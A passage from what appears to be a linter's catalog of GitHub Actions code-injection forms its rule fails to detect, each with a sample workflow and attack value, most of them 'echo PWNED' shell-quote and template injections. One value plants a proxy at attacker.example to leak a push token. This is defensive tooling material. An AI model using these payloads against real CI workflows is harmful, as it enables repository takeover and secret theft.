    #   shell, ~/.bash_profile among them, before the script of the later step,
    #   so the title runs as code in the later step.
    # cause: the rule does not read the write to the startup file as a write of
    #   code.
    # attack-value: github.event.issue.title = "$(echo PWNED)"
    # attack-run-behavior: the first step appends echo $(echo PWNED) to
    #   ~/.bash_profile, and bash -l runs the line before the script of the
    #   second step, which prints PWNED. On 2026-11-16, on ubuntu-latest and
    #   macos-latest, a step with shell: bash -l {0} ran the line that an earlier
    #   step had appended to ~/.bash_profile, and a step with shell: bash {0} did
    #   not.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: echo "echo $ISSUE_TITLE" >> ~/.bash_profile
          - shell: bash -l {0}
            run: echo hi
    ```
- env-variable-other-language: a variable of env that the script of actions/github-script, or a run of pwsh, cmd or python, reads as code of that language (eval(process.env.TITLE), Invoke-Expression \$env:TITLE, exec(os.environ&#91;'TITLE'])): the rule reads the variables of runs of bash only
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: env-variable-other-language.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and passes the variable to eval of
    #   JavaScript in actions/github-script.
    # reason: eval reads the value of process.env.ISSUE_TITLE as JavaScript.
    # cause: the rule reads the variables of runs of bash only.
    # attack-value: github.event.issue.title = "require('child_process').execSync('echo PWNED', {stdio: 'inherit'})"
    # attack-run-behavior: eval runs the JavaScript, which runs echo PWNED.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/github-script@v7
            env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            with:
              script: eval(process.env.ISSUE_TITLE)
    ```
- script-var: a shell variable that a run of bash sets, and whose value the run then reads as code (X=\$TITLE; eval "\$X"; a value that read or \$( ) gives), the output of a command substitution read as code (eval "\$(echo \$TITLE)"), a file that the script writes with the value and then runs (echo "\$TITLE" > f.sh; bash f.sh), and a variable that an earlier step writes to the file \$GITHUB_ENV, which the runner puts into the environment of the later steps: the rule reads a variable only where a key of env: (of the step, the job or the workflow) gives the value, or where the runner writes the variable in every step, and does not follow the value through the script
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: same-file)
  - example: script-var.yml (workflow, undetected)
    ```yaml
    # situation: on an opened issue, a step passes the issue's title in the
    #   environment variable ISSUE_TITLE and assigns the variable to another
    #   variable of the script and runs eval with that one.
    # reason: the value reaches eval through an assignment in the script.
    # cause: the rule reads a variable whose value env gives, and does not follow
    #   the value through the script.
    # attack-value: github.event.issue.title = "$(echo PWNED)"
    # attack-run-behavior: X holds $(echo PWNED); eval reads echo $(echo PWNED) as
    #   a command and prints PWNED.
    on:
      issues:
        types: [opened]
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - env:
              ISSUE_TITLE: ${{ github.event.issue.title }}
            run: X=$ISSUE_TITLE; eval "echo $X"
    ```
- action-input-local: an input of a local composite action (./, in the workspace of the job, which is the repository that the job checks out; \$/, the repository of the action), in a run of the linter that does not read the action.yml of the composite action: a run that reads only the files named on the command line (without --read-all) and does not name the action.yml, a run that reads the workflow from standard input (--stdin-name), or a run that leaves out the directory of the action with --exclude. The rule reads what the composite action does with the input from the steps of the action.yml, and the rule reads the steps of the action.yml only when the run reads the action.yml. A local action that runs JavaScript or a Docker image is the undetected form repository-program
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: repo-file)
  - example: action-input-local.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step gives the issue's title to an input of a
    #   local action (./, in the workspace of the job).
    # reason: a todo (a file of the repository): what the action does with the
    #   input is in the action.yml of ./.github/actions/greet.
    # cause: the run reads only this workflow file (a file named on the command
    #   line, without --read-all), and the rule reads the steps of an action.yml
    #   only when the run reads the action.yml.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the value goes to the input text of
    #   ./.github/actions/greet; when that action's step writes inputs.text into
    #   its run by ${{ }} inside double quotes, as echo "${{ inputs.text }}",
    #   its script becomes echo ""; echo PWNED; echo "", and bash runs the
    #   second echo as a command, which prints PWNED. No run step of this
    #   workflow has the value.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: ./.github/actions/greet
            with:
              text: ${{ github.event.issue.title }}
    ```
- action-input-remote: an input of an action of another repository, other than the script of actions/github-script: what the action does with it is in its action.yml, which the rule does not read
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: action-input-remote.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step gives the issue's title to an input of
    #   some/action, and the issue's body is the github-token of
    #   actions/github-script.
    # reason: a todo (a fact): what an action of another repository does with an
    #   input, other than the script of actions/github-script, is in its
    #   action.yml.
    # cause: the rule does not read that action.yml.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the value goes to the input text of some/action@v1;
    #   when that action's step writes inputs.text into its run by ${{ }} inside
    #   double quotes, as echo "${{ inputs.text }}", its script becomes echo "";
    #   echo PWNED; echo "", and bash runs the second echo as a command, which
    #   prints PWNED. No run step of this workflow has the value.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: some/action@v1
            with:
              text: ${{ github.event.issue.title }}
          - uses: actions/github-script@v7
            with:
              github-token: ${{ github.event.issue.body }}
              script: console.log('hi')
    ```
  - example: action-input-remote.ghsa-4xqx-pqpj-9fqw.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step gives the issue's title and body to the inputs
    #   summary and description of atlassian/gajira-create v2.0.0 (before 2.0.1),
    #   in the way of GHSL-2020-172, which GHSA-4xqx-pqpj-9fqw cites: "the
    #   built-in GitHub context expressions are used by the users of the action
    #   instead, like: … summary: | ${{ github.event.issue.title }}". The inputs
    #   project and issuetype are the values of the README of the action.
    #   Fourteen of the GHSL advisories of 2020 listed below after
    #   GHSA-4xqx-pqpj-9fqw (all of them but GHSL-2020-323) have the same form: a workflow gives the title or the body of an issue,
    #   the body of a comment or the title of a pull request to an input of
    #   atlassian/gajira-create, of atlassian/gajira-comment, or of a fork of
    #   gajira-create (GHSL-2020-208), and each page says that the action expands
    #   {{ }} in the input. on-push-master-notify-discord.yml of
    #   geek-cookbook/geek-cookbook (commit
    #   769313371db2f84abc7a088e306e9595607eaa49, GHSL-2020-323) gives the message
    #   of the first commit of a push to the input args of
    #   Ilshidur/action-discord@master, which the page says reads the input as a
    #   lodash template.
    # reason: a todo (a fact): what an action of another repository does with an
    #   input is in its code; gajira-create v2.0.0 reads the inputs summary and
    #   description as lodash templates (_.template, with {{ }} as the
    #   interpolation), which run what is between {{ and }} as JavaScript.
    # cause: the rule does not read the code of an action of another repository.
    # attack-value: github.event.issue.title = "{{ process.mainModule.require('child_process').execSync('echo PWNED') }}"
    # attack-run-behavior: the value goes to the input summary; the action reads
    #   the input as a template, and node.js runs the JavaScript between {{ and
    #   }}, which starts echo PWNED, with the environment of the job. No run step
    #   of this workflow has the value.
    # advisory: https://github.com/advisories/GHSA-4xqx-pqpj-9fqw
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-174-codacy-coverage-reporter-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-175-codacy-analysis-cli-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-176-codacy-scalameta-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-177-codacy-pylint-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-178-codacy-bitbucket-scala-client-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-179-codacy-coverage-reporter-action-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-180-codacy-helm-ssm-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-181-symless-synergy-core-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-207-hashicorp-boundary-ui-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-208-SourcePointUSA-android-cmp-app-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-209-ww-tech-primrose-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-210-hyperspacedev-starlight-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-211-namin2-dependabot_jira-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-206-saagie-technologies-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-323-geek-cookbook-workflow/
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: atlassian/gajira-create@77d13eab156b8ad1c08c0655011b8a442c502998 # v2.0.0
            with:
              project: GA
              issuetype: Build
              summary: |
                ${{ github.event.issue.title }}
              description: |
                ${{ github.event.issue.body }}
    ```
- action-input-docker: an input of a Docker image (docker://): the image reads it when it runs
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: limitation (decided by: run-time)
  - example: action-input-docker.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step runs docker://alpine:3 with the issue's title
    #   in args.
    # reason: a limitation (run time): the image reads the input when it runs.
    # cause: the rule reads a step's run and the script of
    #   actions/github-script, not an input of a Docker image.
    # attack-value: github.event.issue.title = "echo PWNED"
    # attack-run-behavior: the runner puts the args input as it is after the
    #   image in its docker run command line, so the container runs echo PWNED
    #   in place of the image's command (/bin/sh), which prints PWNED. No run
    #   step has the value.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: docker://alpine:3
            with:
              args: ${{ github.event.issue.title }}
    ```
- repository-program: an attacker's value that a program of the repository reads and then misuses, for example by installing a package whose name is in the value or by writing a file at a path that is in the value: the program is a local action that runs JavaScript or a Docker image (which reads an input or the event payload), or a program that a run starts (node submit.js, which reads a variable of env). The rule reads the scripts of runs and of actions/github-script, not the code of other programs
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: limitation (decided by: run-time)
  - example: repository-program.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a run starts node submitPr.js, a program of the
    #   repository, with the body of the issue in the variable ISSUE_BODY of env
    #   and a token that writes in GITHUB_TOKEN. This is the job publish of
    #   submit.yml of dd-center/vdb (commit
    #   06e81fc6aa74cb1c4bc3df9701c17c93f3a6991a, lines 1-4 and 45-64); the
    #   triggers push and pull_request, the jobs close and pr, and the step Push
    #   changes are left out. submitPr.js decodes commands from a block of the
    #   body, writes a file at join('vtbs', <path>) with a content that the block
    #   names, and then runs git push with the token in the URL of the remote.
    #   plugin-prechecks.yml of homebridge/verified (commit
    #   5674fc615f1f933322cfe6facb007caea366d59a, GHSL-2020-185) uses the local
    #   action ./precheck, a node action whose input body takes
    #   ${{ github.event.issue.body }} as its default; the JavaScript of the
    #   action runs npm install with the name of a package that it reads from the
    #   body, so the install scripts of the package run with the token of the
    #   job.
    # reason: a limitation (run time): what the program does with the value is in
    #   the code of the program, and the run script only passes the value as data.
    # cause: the rule reads the scripts of runs and of actions/github-script, not
    #   the code of other programs.
    # attack-value: github.event.issue.body = "-----BEGIN SUBMIT BLOCK-----cHV0OkxpNHZMbWRwZEM5amIyNW1hV2M9OlcyaDBkSEJkQ2dsd2NtOTRlU0E5SUdoMGRIQTZMeTloZEhSaFkydGxjaTVsZUdGdGNHeGxPamd3T0RBSw==-----END SUBMIT BLOCK-----"
    # attack-run-behavior: the block decodes to put:<path>:<content>, where the
    #   path is ../.git/config and the content is an [http] section with proxy =
    #   http://attacker.example:8080. submitPr.js writes the content to
    #   .git/config, and its git push sends the URL of the remote, which holds the
    #   token in secrets.gtoken, through the proxy of the attacker. No run script
    #   reads the value as code.
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-195-dd-center-vdb-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-185-homebridge-verified-workflow/
    name: Submit Branch
    on:
      issues:
        types: [opened, reopened]
    jobs:
      publish:
        if: github.event_name == 'issues'
        runs-on: ubuntu-latest
        steps:
        - uses: actions/checkout@v1

        - name: Use Node.js 13
          uses: actions/setup-node@v1
          with:
            node-version: '13'

        - name: npm install
          run: npm install

        - name: Commit Branch
          run: node submitPr.js
          env:
            ISSUE_NUMBER: ${{ github.event.issue.number }}
            ISSUE_BODY: ${{ github.event.issue.body }}
            GITHUB_TOKEN: ${{ secrets.gtoken }}
    ```
- pull-request: a job that runs only on pull_request, in one of two cases. In the first case, only the pull requests of the repository run the workflow: the author of a pull request can change the workflow itself, so the run of the job gives the author what the run has (read-only from a fork, or what a private repository sends to the runs of pull requests from forks: secrets, a token that writes) without the flaw of the rule, and the flaw of the rule adds nothing to what the author gets. In the second case, a ruleset of the organization or the enterprise runs the workflow on the pull requests of its other repositories (Require workflows to pass before merging, of GitHub Enterprise): the author of such a pull request cannot change the workflow, and whether the run has more than the pull_request workflow of the author would get (the token, secrets) is known from GitHub's documentation only, as no such run was observed; making a required check pass is outside the threat model of the rule. The workflow does not say which case holds, and the rule does not read which case holds
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: pull-request.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request, a run writes the pull request's title and
    #   github.head_ref. pr_title.yml of aws/aws-sam-cli (commit
    #   8435b574aa0c30abb68730575463693c2361b783, GHSL-2020-230), wipcheck.yml of
    #   the repositories of graphql-dotnet (for example graphql-dotnet/server,
    #   commit 31d3858bb57f7b67beebcfdae4eeab9f8805811d, GHSL-2020-231) and
    #   test_build_deploy.yml of wireapp/wire-webapp (commit
    #   5bdd49291b278d6d3d5fe89f1e656a556bd6db8e, GHSL-2020-232) write the title
    #   of the pull request into a run on pull_request.
    # reason: when only the pull requests of the repository run the workflow, the
    #   author of the pull request can change the workflow itself and gets what the
    #   run has without the flaw, so the flaw adds nothing to what the author gets;
    #   when a ruleset of the organization or the enterprise runs the workflow on
    #   the pull requests of its other repositories, the author cannot change the
    #   workflow, and what the run of the ruleset has beyond the author's own
    #   pull_request workflow is not known. The workflow does not say which case
    #   holds.
    # cause: pull_request is none of the attacker's events the rule reads. The
    #   rule does not read whether a ruleset runs the workflow.
    # attack-value: github.head_ref = "\";echo${IFS}PWNED;#"
    # attack-run-behavior: the branch name of the pull request is the value, so
    #   the script becomes echo "<title> ";echo${IFS}PWNED;#": the double quote ends
    #   echo's string, bash splits echo${IFS}PWNED into echo PWNED and runs it,
    #   which prints PWNED, and # makes the rest a comment. When a ruleset of the
    #   organization runs the workflow on a pull request of another repository, the
    #   same steps run in the run of the ruleset; what the run of the ruleset has
    #   was not observed, so whether the steps do harm in the run of the ruleset is
    #   not known.
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-230-aws-aws-sam-cli-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-231-graphql-dotnet-workflow/
    # advisory: https://securitylab.github.com/advisories/GHSL-2020-232-wireapp-wire-webapp-workflow/
    on: pull_request
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.pull_request.title }} ${{ github.head_ref }}"
    ```
- dispatch: a value of the event of workflow_dispatch other than its inputs, in a job that runs only on workflow_dispatch: the event has the ref, which is a branch or a tag that the repository already has, and values that GitHub fills, such as the login of the account that dispatches the workflow; the event has no text of an issue, a comment or a pull request. Whoever dispatches the workflow chooses the ref and the inputs of the dispatch, and nothing else of the event. A token that cannot change the files of the repository can dispatch the workflow, such as a fine-grained token that has the permission Actions with write access and no permission Contents. The rule reports an input of the dispatch with the inconclusive kind input-dispatch
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: dispatch.yml (workflow, undetected)
    ```yaml
    # situation: on workflow_dispatch, a run writes the title of the issue into
    #   its script. If the workflow also ran on issues, the rule would report
    #   the same step.
    # reason: no added gain: on workflow_dispatch the event has no issue object,
    #   so the expression of the title gives an empty string; whoever dispatches
    #   the workflow chooses the ref and the inputs of the dispatch, and the step
    #   reads no input of the dispatch.
    # cause: the table of the attacker's events that the rule reads does not
    #   have workflow_dispatch; the rule reports an input of a dispatch with the
    #   inconclusive kind input-dispatch.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: with the value put in, the script becomes echo "";
    #   echo PWNED; echo "", and bash runs echo PWNED as a command. On
    #   workflow_dispatch the event has no issue object, though: the expression
    #   gives an empty string, and the script prints an empty line.
    on: workflow_dispatch
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
    ```
- repository-dispatch: a value of the client_payload of repository_dispatch (github.event.client_payload): only a credential with write access to the permission Contents of the repository can send repository_dispatch, and the credential premise assumes that no attacker holds such a credential; the sender chooses the whole client_payload
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: repository-dispatch.yml (workflow, undetected)
    ```yaml
    # situation: on repository_dispatch, a run writes the value title of the
    #   client_payload into its script.
    # reason: the form adds nothing to what the attacker gets (the disposition
    #   no-added-gain): only a credential with write access to the permission
    #   Contents of the repository can send repository_dispatch, and the
    #   credential premise assumes that no attacker holds such a credential; the
    #   sender chooses the whole client_payload.
    # cause: the table of the attacker's events that the rule reads leaves out
    #   repository_dispatch on purpose: the credential premise leaves the sender
    #   of repository_dispatch out of the threat model.
    # attack-value: github.event.client_payload.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: when a repository_dispatch with the value in its
    #   client_payload runs the workflow, the script becomes echo ""; echo PWNED;
    #   echo "", and bash runs echo PWNED as a command.
    on: repository_dispatch
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.client_payload.title }}"
    ```
- app-written: a value that an app outside GitHub Actions writes into a field of a commit status or a check run (the fields context, description and target_url of status; the fields name, output, details_url and external_id of check_run): the app may copy a value of a pull request from a fork into the field, such as the name of a job that a configuration file of the pull request gives to an outside CI; the rule reads the field as a field whose value the app chooses
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: app-written.yml (workflow, undetected)
    ```yaml
    # situation: on check_run, which an app outside GitHub Actions starts when
    #   the app makes a check run for a commit, the job writes the name of the
    #   check run (github.event.check_run.name) where the rule reads it.
    # reason: a todo (a fact): the app writes the name of the check run, and an
    #   app may copy a value of a pull request from a fork into the name, such
    #   as the name of a job that a configuration file of the pull request gives
    #   to an outside CI.
    # cause: the table of what an attacker controls reads the values that the
    #   app writes into a commit status or a check run as the values that the
    #   app chooses.
    # attack-value: github.event.check_run.name = "$(echo PWNED)"
    # attack-run-behavior: an outside CI copies the name of a job from the
    #   configuration file of the pull request from a fork into the name of the
    #   check run; the run of check_run starts on the default branch, and the
    #   value does there what the attack value of the message of the commit does
    #   on status.
    on: check_run
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.check_run.name }}"
    ```
- deployment-status: a value of the payload of deployment_status, such as the SHA of the deployment (deployment.sha), when an app outside GitHub Actions makes a deployment and a status of the deployment for a commit of a pull request from a fork: no run of deployment_status started when the authors of the linter tried this, and why the run did not start was not found; the rule does not read deployment_status as an event that an attacker starts
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: fact)
  - example: deployment-status.yml (workflow, undetected)
    ```yaml
    # situation: on deployment_status, which an app outside GitHub Actions
    #   starts when the app makes a status of a deployment, the job writes the
    #   description of the deployment (github.event.deployment.description)
    #   where the rule reads it.
    # reason: a todo (a fact): no run of deployment_status started when a GitHub
    #   App made a deployment and a status of the deployment for a commit of a
    #   pull request from a fork (seen on GitHub), and why the run did not start
    #   was not found.
    # cause: the table of the attacker's events that the rule reads does not
    #   have deployment_status.
    # attack-value: github.event.deployment.description = "$(echo PWNED)"
    # attack-run-behavior: an outside app makes a deployment for the commit of
    #   the pull request from a fork with a description that the pull request
    #   gives, and a status of the deployment; if a run of deployment_status
    #   starts on the default branch, the value does there what the attack value
    #   of the message of the commit does on status.
    on: deployment_status
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.deployment.description }}"
    ```
- dispatch-relay: a workflow on an event of an attacker that puts a value the attacker writes into the client_payload of a repository_dispatch that the workflow sends (gh api with client_payload to the endpoint dispatches, peter-evans/repository-dispatch), and a workflow on repository_dispatch that uses the value: the flaw is in the workflow that sends the repository_dispatch, and the rule does not read what a workflow sends to another workflow
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: repo-file)
  - example: .github/workflows/receiver.yml (workflow, undetected)
    ```yaml
    # situation: sender.yml runs on issues opened, and with the GITHUB_TOKEN
    #   sends a repository_dispatch of the type relay whose client_payload has the
    #   title of the issue as the value title; receiver.yml runs on that
    #   repository_dispatch, and a run writes the value title of the
    #   client_payload into its script.
    # reason: the author of the issue writes the value, and sender.yml relays
    #   the value to receiver.yml in a repository_dispatch that a run of the
    #   repository sends with a token of the repository; GitHub creates a workflow
    #   run for a repository_dispatch sent with the GITHUB_TOKEN, as an exception
    #   to the rule that an event that the GITHUB_TOKEN triggers creates no
    #   workflow run.
    # cause: the rule reads the events of each workflow alone, and does not read
    #   what a workflow sends to another workflow as the client_payload of a
    #   repository_dispatch.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the attacker opens an issue whose title is the value;
    #   sender.yml sends the value, and in the run of receiver.yml the script
    #   becomes echo ""; echo PWNED; echo "", and bash runs echo PWNED as a
    #   command.
    on:
      repository_dispatch:
        types: [relay]
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.client_payload.title }}"
    ```
    - .github/workflows/sender.yml (workflow)
      ```yaml
      on:
        issues:
          types: [opened]
      permissions:
        contents: write
      jobs:
        relay:
          runs-on: ubuntu-latest
          steps:
            - env:
                GH_TOKEN: ${{ github.token }}
                VALUE: ${{ github.event.issue.title }}
              run: gh api "repos/$GITHUB_REPOSITORY/dispatches" -f event_type=relay -f "client_payload[title]=$VALUE"
      ```
- dispatch-input-call: an input of workflow_dispatch that a caller of the same repository passes, as an input of the call (under the key with: of the calling job or step), to a reusable workflow or a composite action, which uses the input as a value: the one who dispatches the caller chooses the value, and the rule reads the events of a called workflow or action from the table of the callers, and does not follow the value of an input of workflow_dispatch that the caller gives
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: todo (needs: repo-file)
  - example: .github/workflows/called.yml (workflow, undetected)
    ```yaml
    # situation: caller.yml runs on workflow_dispatch with the input x, and
    #   calls called.yml with the input x of the dispatch as the input x of
    #   called.yml; called.yml writes the input x into the script of a run.
    # reason: the one who dispatches caller.yml chooses the value:
    #   input-dispatch reports such a value where a workflow on workflow_dispatch
    #   refers to its input directly, but through the call the value is the input
    #   x of called.yml.
    # cause: the rule reads the events of a called workflow from the table of
    #   the callers, and does not follow the value of an input of
    #   workflow_dispatch that a caller gives in with.
    # attack-value: inputs.x = "\"; echo PWNED; echo \""
    # attack-run-behavior: when the one who dispatches caller.yml gives the
    #   value as x, the script becomes echo ""; echo PWNED; echo "", and bash runs
    #   echo PWNED as a command.
    on:
      workflow_call:
        inputs:
          x: {type: string}
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ inputs.x }}"
    ```
    - .github/workflows/caller.yml (workflow)
      ```yaml
      on:
        workflow_dispatch:
          inputs:
            x: {type: string}
      jobs:
        call:
          uses: ./.github/workflows/called.yml
          with:
            x: ${{ inputs.x }}
          secrets: inherit
      ```
- outside-caller: a reusable workflow or composite action that callers in the repository decide, called from another repository on an event, or with a value, an attacker controls: the caller's run has the caller's token and secrets, not the repository's
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: .github/workflows/called.yml (workflow, undetected)
    ```yaml
    # situation: the workflow is called; a run writes github.event.issue.title.
    #   Its one caller in the repository, ci.yml, runs on push.
    # reason: no added gain for this repository: ci.yml calls the workflow on
    #   push alone, and github.event of a push has no issue, so the value that the
    #   run reads is not a value that an attacker wrote. Another repository may
    #   call the workflow on an event whose payload has what an attacker wrote,
    #   but that run has the token and the secrets of the other repository.
    # cause: the rule reads a called workflow on the events of its callers in
    #   the repository, and ci.yml runs on push alone.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: ci.yml calls it on push, whose payload has no issue,
    #   so there the expression is empty; when a workflow of another repository
    #   calls it on issues, the script becomes echo ""; echo PWNED; echo "" in
    #   that run, and bash runs the second echo as a command, which prints
    #   PWNED.
    on:
      workflow_call:
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
    ```
    - .github/workflows/ci.yml (workflow)
      ```yaml
      on: push
      jobs:
        call:
          uses: ./.github/workflows/called.yml
      ```
- fixed: a context an attacker cannot shape into code: a SHA, a number, a date, the name of an account (github.actor, a login), a URL that GitHub builds from the name of an account or from the name of the repository the workflow runs in (github.event.sender.html_url, github.event.repository.html_url), and other values that GitHub or the repository sets (github.event.action, github.event.repository.default_branch)
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - example: fixed.yml (workflow, undetected)
    ```yaml
    # situation: on pull_request_target, a run writes a SHA, a number, a date, a
    #   username, URLs GitHub builds from a username or from the repository and a
    #   number, and what GitHub or the repository sets.
    # reason: no added gain: an attacker cannot shape them into code.
    # cause: the rule's table of contexts marks them as values an attacker does
    #   not write freely.
    # attack-value: github.event.pull_request.head.sha = ";echo PWNED;"
    # attack-run-behavior: the step folds its lines into one, echo followed by
    #   the 17 values unquoted; GitHub sets head.sha to the 40 hex digits of a
    #   commit's SHA, so it is never the value; were it, the script would become
    #   echo ;echo PWNED; <the other values>, and bash would run echo PWNED as a
    #   command.
    on: pull_request_target
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: >-
              echo ${{ github.event.pull_request.head.sha }} ${{ github.event.pull_request.number }}
              ${{ github.event.pull_request.created_at }} ${{ github.run_id }} ${{ github.repository }}
              ${{ github.sha }} ${{ github.workspace }} ${{ github.event.action }}
              ${{ github.actor }} ${{ github.triggering_actor }} ${{ github.event.sender.login }}
              ${{ github.event.pull_request.user.login }} ${{ github.event.pull_request.head.repo.owner.login }}
              ${{ github.event.sender.html_url }} ${{ github.event.sender.gravatar_id }} ${{ github.event.pull_request.user.html_url }} ${{ github.event.pull_request.html_url }}
    ```
- not-attacker: secrets, vars, runner, the outcome of a step, the result of a job. A run of the linter that adds the attacker variables-writer reports a reference of vars where the rule reads the value as written by the attacker, and a run of the linter that adds the attacker secrets-writer reports such a reference of secrets except secrets.GITHUB_TOKEN (--add-attacker); no run reports runner, the outcome of a step or the result of a job
  - finding kinds: code-injection.controlled, code-injection.env-variable, code-injection.env-variable-wiki, code-injection.wiki
  - disposition: no-added-gain
  - added attackers: variables-writer, secrets-writer
  - example: not-attacker.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a run writes secrets, variables, the runner, the
    #   outcome of a step and the result of a job.
    # reason: no added gain: no attacker writes them.
    # cause: the rule reads as what an attacker may write only references to
    #   github (through its table of contexts), env, the outputs of steps and of
    #   jobs needed, inputs and matrix; secrets, vars, runner, steps.<id>.outcome
    #   and needs.<id>.result are none of these, so it reads them as values no
    #   attacker writes.
    # attack-value: vars.NAME = "\"; echo PWNED; echo \""
    ```
